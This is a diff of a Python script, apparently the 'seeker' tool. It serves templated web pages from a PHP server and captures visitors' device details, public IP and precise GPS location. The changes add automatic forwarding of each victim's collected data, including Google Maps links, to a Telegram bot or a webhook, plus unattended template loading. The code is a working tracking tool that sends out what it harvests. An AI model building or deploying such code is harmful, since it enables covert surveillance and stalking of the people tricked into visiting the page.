@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-VERSION = '1.2.8'
+VERSION = '1.3.1'
 
 R = '\033[31m'  # red
 G = '\033[32m'  # green
@@ -9,10 +9,13 @@ W = '\033[0m'   # white
 Y = '\033[33m'  # yellow
 
 import sys
+import utils
 import argparse
 import requests
 import traceback
-from os import path, kill, mkdir
+import shutil
+from time import sleep
+from os import path, kill, mkdir, getenv, environ, remove, devnull
 from json import loads, decoder
 from packaging import version
 
@@ -21,12 +24,25 @@ parser.add_argument('-k', '--kml', help='KML filename')
 parser.add_argument('-p', '--port', type=int, default=8080, help='Web server port [ Default : 8080 ]')
 parser.add_argument('-u', '--update', action='store_true', help='Check for updates')
 parser.add_argument('-v', '--version', action='store_true', help='Prints version')
+parser.add_argument('-t', '--template', type=int, help='Load template and loads parameters from env variables')
+parser.add_argument('-d', '--debugHTTP', type=bool, default=False, help='Disable HTTPS redirection for testing only')
+parser.add_argument('-tg', '--telegram', help='Telegram bot API token [ Format -> token:chatId ]')
+parser.add_argument('-wh', '--webhook', help='Webhook URL [ POST method & unauthenticated ]')
 
 args = parser.parse_args()
 kml_fname = args.kml
-port = args.port
+port = getenv('PORT') or args.port
 chk_upd = args.update
 print_v = args.version
+telegram = getenv('TELEGRAM') or args.telegram
+webhook = getenv('WEBHOOK') or args.webhook
+
+if (getenv('DEBUG_HTTP') and (getenv('DEBUG_HTTP') == '1' or getenv('DEBUG_HTTP').lower() == 'true')) or args.debugHTTP is True:
+	environ['DEBUG_HTTP'] = '1'
+else:
+	environ['DEBUG_HTTP'] = '0'
+
+templateNum = int(getenv('TEMPLATE')) if getenv('TEMPLATE') and getenv('TEMPLATE').isnumeric() else args.template
 
 path_to_script = path.dirname(path.realpath(__file__))
 
@@ -42,6 +58,7 @@ TEMPLATES_JSON = f'{path_to_script}/template/templates.json'
 TEMP_KML = f'{path_to_script}/template/sample.kml'
 META_FILE = f'{path_to_script}/metadata.json'
 META_URL = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/metadata.json'
+PID_FILE = f'{path_to_script}/pid'
 
 if not path.isdir(LOG_DIR):
 	mkdir(LOG_DIR)
@@ -49,9 +66,10 @@ if not path.isdir(LOG_DIR):
 if not path.isdir(DB_DIR):
 	mkdir(DB_DIR)
 
+
 def chk_update():
 	try:
-		print('> Fetching Metadata...', end='', flush=True)
+		print('> Fetching Metadata...', end='')
 		rqst = requests.get(META_URL, timeout=5)
 		meta_sc = rqst.status_code
 		if meta_sc == 200:
@@ -64,7 +82,7 @@ def chk_update():
 			else:
 				print('> Already up to date.')
 	except Exception as exc:
-		print(f'Exception : {str(exc)}')
+		utils.print(f'Exception : {str(exc)}')
 
 
 if chk_upd is True:
@@ -72,15 +90,21 @@ if chk_upd is True:
 	sys.exit()
 
 if print_v is True:
-	print(VERSION)
+	utils.print(VERSION)
 	sys.exit()
 
+import socket
 import importlib
 from csv import writer
-from time import sleep
 import subprocess as subp
 from ipaddress import ip_address
 from signal import SIGTERM
+
+# temporary workaround for psutil exception on termux
+with open(devnull, 'w') as nf:
+	sys.stderr = nf
+	import psutil
+sys.stderr = sys.__stderr__
 
 
 def banner():
@@ -96,15 +120,37 @@ def banner():
  \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
 /____  > \___  >\___  >|__|_ \ \___  >|__|
      \/      \/     \/      \/     \/'''
-	print(f'{G}{art}{W}\n')
-	print(f'{G}[>] {C}Created By   : {W}thewhiteh4t')
-	print(f'{G} |---> {C}Twitter   : {W}{twitter_url}')
-	print(f'{G} |---> {C}Community : {W}{comms_url}')
-	print(f'{G}[>] {C}Version      : {W}{VERSION}\n')
+	utils.print(f'{G}{art}{W}\n')
+	utils.print(f'{G}[>] {C}Created By   : {W}thewhiteh4t')
+	utils.print(f'{G} |---> {C}Twitter   : {W}{twitter_url}')
+	utils.print(f'{G} |---> {C}Community : {W}{comms_url}')
+	utils.print(f'{G}[>] {C}Version      : {W}{VERSION}\n')
+
+
+def send_webhook(content, msg_type):
+	if webhook is not None:
+		if not webhook.lower().startswith('http://') and not webhook.lower().startswith('https://'):
+			utils.print(f'{R}[-] {C}Protocol missing, include http:// or https://{W}')
+			return
+		if webhook.lower().startswith('https://discord.com/api/webhooks'):
+			from discord_webhook import discord_sender
+			discord_sender(webhook, msg_type, content)
+		else:
+			requests.post(webhook, json=content)
+
+
+def send_telegram(content, msg_type):
+	if telegram is not None:
+		tmpsplit = telegram.split(':')
+		if len(tmpsplit) < 3:
+			utils.print(f'{R}[-] {C}Telegram API token invalid! Format -> token:chatId{W}')
+			return
+		from telegram_api import tgram_sender
+		tgram_sender(msg_type, content, tmpsplit)
 
 
 def template_select(site):
-	print(f'{Y}[!] Select a Template :{W}\n')
+	utils.print(f'{Y}[!] Select a Template :{W}\n')
 
 	with open(TEMPLATES_JSON, 'r') as templ:
 		templ_info = templ.read()
@@ -113,69 +159,107 @@ def template_select(site):
 
 	for item in templ_json['templates']:
 		name = item['name']
-		print(f'{G}[{templ_json["templates"].index(item)}] {C}{name}{W}')
+		utils.print(f'{G}[{templ_json["templates"].index(item)}] {C}{name}{W}')
 
 	try:
-		selected = int(input(f'{G}[>] {W}'))
+		selected = -1
+		if templateNum is not None:
+			if templateNum >= 0 and templateNum < len(templ_json['templates']):
+				selected = templateNum
+		else:
+			selected = int(input(f'{G}[>] {W}'))
 		if selected < 0:
 			print()
-			print(f'{R}[-] {C}Invalid Input!{W}')
+			utils.print(f'{R}[-] {C}Invalid Input!{W}')
 			sys.exit()
 	except ValueError:
 		print()
-		print(f'{R}[-] {C}Invalid Input!{W}')
+		utils.print(f'{R}[-] {C}Invalid Input!{W}')
 		sys.exit()
 
 	try:
 		site = templ_json['templates'][selected]['dir_name']
 	except IndexError:
 		print()
-		print(f'{R}[-] {C}Invalid Input!{W}')
+		utils.print(f'{R}[-] {C}Invalid Input!{W}')
 		sys.exit()
 
 	print()
-	print(f'{G}[+] {C}Loading {Y}{templ_json["templates"][selected]["name"]} {C}Template...{W}')
+	utils.print(f'{G}[+] {C}Loading {Y}{templ_json["templates"][selected]["name"]} {C}Template...{W}')
 
-	module = templ_json['templates'][selected]['module']
-	if module is True:
-		imp_file = templ_json['templates'][selected]['import_file']
-		importlib.import_module(f'template.{imp_file}')
-	else:
-		pass
+	imp_file = templ_json['templates'][selected]['import_file']
+	importlib.import_module(f'template.{imp_file}')
+	shutil.copyfile('php/error.php', f'template/{templ_json["templates"][selected]["dir_name"]}/error_handler.php')
+	shutil.copyfile('php/info.php', f'template/{templ_json["templates"][selected]["dir_name"]}/info_handler.php')
+	shutil.copyfile('php/result.php', f'template/{templ_json["templates"][selected]["dir_name"]}/result_handler.php')
+	jsdir = f'template/{templ_json["templates"][selected]["dir_name"]}/js'
+	if not path.isdir(jsdir):
+		mkdir(jsdir)
+	shutil.copyfile('js/location.js', jsdir + '/location.js')
 	return site
 
 
 def server():
 	print()
-	preoc = False
-	print(f'{G}[+] {C}Port : {W}{port}\n')
-	print(f'{G}[+] {C}Starting PHP Server...{W}', end='', flush=True)
+	port_free = False
+	utils.print(f'{G}[+] {C}Port : {W}{port}\n')
+	utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
 	cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']
 
-	with open(LOG_FILE, 'w+') as phplog:
+	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+		try:
+			sock.connect(('127.0.0.1', port))
+		except ConnectionRefusedError:
+			port_free = True
+
+	if not port_free and path.exists(PID_FILE):
+		with open(PID_FILE, 'r') as pid_info:
+			pid = int(pid_info.read().strip())
+			try:
+				old_proc = psutil.Process(pid)
+				utils.print(f'{C}[ {R}✘{C} ]{W}')
+				utils.print(f'{Y}[!] Old instance of php server found, restarting...{W}')
+				utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
+				try:
+					sleep(1)
+					if old_proc.status() != 'running':
+						old_proc.kill()
+					else:
+						utils.print(f'{C}[ {R}✘{C} ]{W}')
+						utils.print(f'{R}[-] {C}Unable to kill php server process, kill manually{W}')
+						sys.exit()
+				except psutil.NoSuchProcess:
+					pass
+			except psutil.NoSuchProcess:
+				utils.print(f'{C}[ {R}✘{C} ]{W}')
+				utils.print(f'{R}[-] {C}Port {W}{port} {C}is being used by some other service.{W}')
+				sys.exit()
+	elif not port_free and not path.exists(PID_FILE):
+		utils.print(f'{C}[ {R}✘{C} ]{W}')
+		utils.print(f'{R}[-] {C}Port {W}{port} {C}is being used by some other service.{W}')
+		sys.exit()
+	elif port_free:
+		pass
+
+	with open(LOG_FILE, 'w') as phplog:
 		proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
+		with open(PID_FILE, 'w') as pid_out:
+			pid_out.write(str(proc.pid))
+
 		sleep(3)
-		phplog.seek(0)
-		if 'Address already in use' in phplog.readline():
-			preoc = True
+
 		try:
 			php_rqst = requests.get(f'http://127.0.0.1:{port}/index.html')
 			php_sc = php_rqst.status_code
 			if php_sc == 200:
-				if preoc:
-					print(f'{C}[ {G}✔{C} ]{W}')
-					print(f'{Y}[!] Server is already running!{W}')
-					print()
-				else:
-					print(f'{C}[ {G}✔{C} ]{W}')
-					print()
+				utils.print(f'{C}[ {G}✔{C} ]{W}')
+				print()
 			else:
-				print(f'{C}[ {R}Status : {php_sc}{C} ]{W}')
-				cl_quit(proc)
+				utils.print(f'{C}[ {R}Status : {php_sc}{C} ]{W}')
+				cl_quit()
 		except requests.ConnectionError:
-			print(f'{C}[ {R}✘{C} ]{W}')
-			cl_quit(proc)
-	return proc
+			utils.print(f'{C}[ {R}✘{C} ]{W}')
+			cl_quit()
 
 
 def wait():
@@ -184,7 +268,7 @@ def wait():
 		sleep(2)
 		size = path.getsize(RESULT)
 		if size == 0 and printed is False:
-			print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')
+			utils.print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')
 			printed = True
 		if size > 0:
 			data_parser()
@@ -194,11 +278,13 @@ def wait():
 def data_parser():
 	data_row = []
 	with open(INFO, 'r') as info_file:
-		info_file = info_file.read()
+		info_content = info_file.read()
+	if not info_content or info_content.strip() == '':
+		return
 	try:
-		info_json = loads(info_file)
+		info_json = loads(info_content)
 	except decoder.JSONDecodeError:
-		print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
+		utils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
 	else:
 		var_os = info_json['os']
 		var_platform = info_json['platform']
@@ -211,8 +297,7 @@ def data_parser():
 		var_ip = info_json['ip']
 
 		data_row.extend([var_os, var_platform, var_cores, var_ram, var_vendor, var_render, var_res, var_browser, var_ip])
-
-		print(f'''{Y}[!] Device Information :{W}
+		device_info = f'''{Y}[!] Device Information :{W}
 
 {G}[+] {C}OS         : {W}{var_os}
 {G}[+] {C}Platform   : {W}{var_platform}
@@ -223,10 +308,13 @@ def data_parser():
 {G}[+] {C}Resolution : {W}{var_res}
 {G}[+] {C}Browser    : {W}{var_browser}
 {G}[+] {C}Public IP  : {W}{var_ip}
-''')
+'''
+		utils.print(device_info)
+		send_telegram(info_json, 'device_info')
+		send_webhook(info_json, 'device_info')
 
 		if ip_address(var_ip).is_private:
-			print(f'{Y}[!] Skipping IP recon because IP address is private{W}')
+			utils.print(f'{Y}[!] Skipping IP recon because IP address is private{W}')
 		else:
 			rqst = requests.get(f'https://ipwhois.app/json/{var_ip}')
 			s_code = rqst.status_code
@@ -242,8 +330,7 @@ def data_parser():
 				var_isp = str(data['isp'])
 
 				data_row.extend([var_continent, var_country, var_region, var_city, var_org, var_isp])
-
-				print(f'''{Y}[!] IP Information :{W}
+				ip_info = f'''{Y}[!] IP Information :{W}
 
 {G}[+] {C}Continent : {W}{var_continent}
 {G}[+] {C}Country   : {W}{var_country}
@@ -251,14 +338,17 @@ def data_parser():
 {G}[+] {C}City      : {W}{var_city}
 {G}[+] {C}Org       : {W}{var_org}
 {G}[+] {C}ISP       : {W}{var_isp}
-''')
+'''
+				utils.print(ip_info)
+				send_telegram(data, 'ip_info')
+				send_webhook(data, 'ip_info')
 
 	with open(RESULT, 'r') as result_file:
 		results = result_file.read()
 		try:
 			result_json = loads(results)
 		except decoder.JSONDecodeError:
-			print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
+			utils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
 		else:
 			status = result_json['status']
 			if status == 'success':
@@ -270,8 +360,7 @@ def data_parser():
 				var_spd = result_json['spd']
 
 				data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])
-
-				print(f'''{Y}[!] Location Information :{W}
+				loc_info = f'''{Y}[!] Location Information :{W}
 
 {G}[+] {C}Latitude  : {W}{var_lat}
 {G}[+] {C}Longitude : {W}{var_lon}
@@ -279,15 +368,23 @@ def data_parser():
 {G}[+] {C}Altitude  : {W}{var_alt}
 {G}[+] {C}Direction : {W}{var_dir}
 {G}[+] {C}Speed     : {W}{var_spd}
-''')
-
-				print(f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}')
+'''
+				utils.print(loc_info)
+				send_telegram(result_json, 'location')
+				send_webhook(result_json, 'location')
+				gmaps_url = f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
+				gmaps_json = {'url': f'https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'}
+				utils.print(gmaps_url)
+				send_telegram(gmaps_json, 'url')
+				send_webhook(gmaps_json, 'url')
 
 				if kml_fname is not None:
 					kmlout(var_lat, var_lon)
 			else:
 				var_err = result_json['error']
-				print(f'{R}[-] {C}{var_err}\n')
+				utils.print(f'{R}[-] {C}{var_err}\n')
+				send_telegram(result_json, 'error')
+				send_webhook(result_json, 'error')
 
 	csvout(data_row)
 	clear()
@@ -304,15 +401,15 @@ def kmlout(var_lat, var_lon):
 	with open(f'{path_to_script}/{kml_fname}.kml', 'w') as kml_gen:
 		kml_gen.write(kml_sample_data)
 
-	print(f'{Y}[!] KML File Generated!{W}')
-	print(f'{G}[+] {C}Path : {W}{path_to_script}/{kml_fname}.kml')
+	utils.print(f'{Y}[!] KML File Generated!{W}')
+	utils.print(f'{G}[+] {C}Path : {W}{path_to_script}/{kml_fname}.kml')
 
 
 def csvout(row):
 	with open(DATA_FILE, 'a') as csvfile:
 		csvwriter = writer(csvfile)
 		csvwriter.writerow(row)
-	print(f'{G}[+] {C}Data Saved : {W}{path_to_script}/db/results.csv\n')
+	utils.print(f'{G}[+] {C}Data Saved : {W}{path_to_script}/db/results.csv\n')
 
 
 def clear():
@@ -327,10 +424,11 @@ def repeat():
 	wait()
 
 
-def cl_quit(proc):
-	clear()
-	if proc:
-		kill(proc.pid, SIGTERM)
+def cl_quit():
+	with open(PID_FILE, 'r') as pid_info:
+		pid = int(pid_info.read().strip())
+		kill(pid, SIGTERM)
+	remove(PID_FILE)
 	sys.exit()
 
 
@@ -338,11 +436,11 @@ try:
 	banner()
 	clear()
 	SITE = template_select(SITE)
-	SERVER_PROC = server()
+	server()
 	wait()
 	data_parser()
 except KeyboardInterrupt:
-	print(f'{R}[-] {C}Keyboard Interrupt.{W}')
-	cl_quit(SERVER_PROC)
+	utils.print(f'{R}[-] {C}Keyboard Interrupt.{W}')
+	cl_quit()
 else:
 	repeat()
